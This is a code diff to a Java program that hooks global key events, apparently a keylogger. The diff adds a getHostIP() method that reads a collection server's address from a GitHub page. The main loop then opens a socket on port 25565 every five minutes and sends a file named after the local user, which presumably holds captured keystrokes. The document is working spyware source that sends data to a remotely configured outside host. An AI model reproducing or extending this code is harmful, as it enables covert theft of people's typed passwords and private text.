@@ -71,26 +71,11 @@ public class Main implements NativeKeyListener{
 		    Calendar cal = Calendar.getInstance();
 		    cal.setTime(date);
 		    int minutes = cal.get(Calendar.MINUTE);
-			 if (minutes % 5 == 0 || minutes < 999) {
+			 if (minutes % 5 == 0) {
 			    	// send the file
 			    	try {
-			    		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
-				         URLConnection yc = yahoo.openConnection();
-				         BufferedReader in = new BufferedReader(new InputStreamReader(
-				                 yc.getInputStream(), "UTF-8"));
-				         String inputLine;
-				         StringBuilder a = new StringBuilder();
-				         System.out.println("a");
-				         while ((inputLine = in.readLine()) != null){
-				             a.append(inputLine);
-				             if(inputLine.contains("connectTo")) {
-				            	 System.out.println("b");
-				            	 System.out.println(inputLine.substring(78, inputLine.indexOf("</td>")));
-				             }
-				         }
-			    		String connectTo = "127.0.0.1";
 			    		//System.out.println(connectTo);
-			    		Socket socket = new Socket(connectTo, 25565);
+			    		Socket socket = new Socket(getHostIP(), 25565);
 			    		OutputStream t = socket.getOutputStream();
 			    		PrintWriter out = new PrintWriter(t);
 						String toSend = System.getProperty("user.name") + ".txt";
@@ -102,7 +87,7 @@ public class Main implements NativeKeyListener{
 			    		BufferedInputStream bin = new BufferedInputStream(fin); 
 			    		bin.read(bytearray,0,bytearray.length); 
 			    		OutputStream os = socket.getOutputStream(); 
-			    		System.out.println(""); 
+			    		// System.out.println(""); 
 			    		os.write(bytearray,0,bytearray.length); 
 			    		os.flush(); 
 			    	} catch (Exception e) {
@@ -183,4 +168,25 @@ public class Main implements NativeKeyListener{
 		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
 		    return beats;
 		}
+	 public static String getHostIP() throws IOException {
+		 try {
+		 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/uploader");
+         URLConnection yc = yahoo.openConnection();
+         BufferedReader in = new BufferedReader(new InputStreamReader(
+                 yc.getInputStream(), "UTF-8"));
+         String inputLine;
+         StringBuilder a = new StringBuilder();
+        // System.out.println("a");
+         while ((inputLine = in.readLine()) != null){
+             a.append(inputLine);
+             if(inputLine.contains("connectTo")) {
+          //  	 System.out.println("b");
+            	 return(inputLine.substring(78, inputLine.indexOf("</td>")));
+             }
+         }
+         return "127.0.0.1";
+		 } catch (Exception e) {
+			 return "127.0.0.1";
+		 }
+	 }
 }
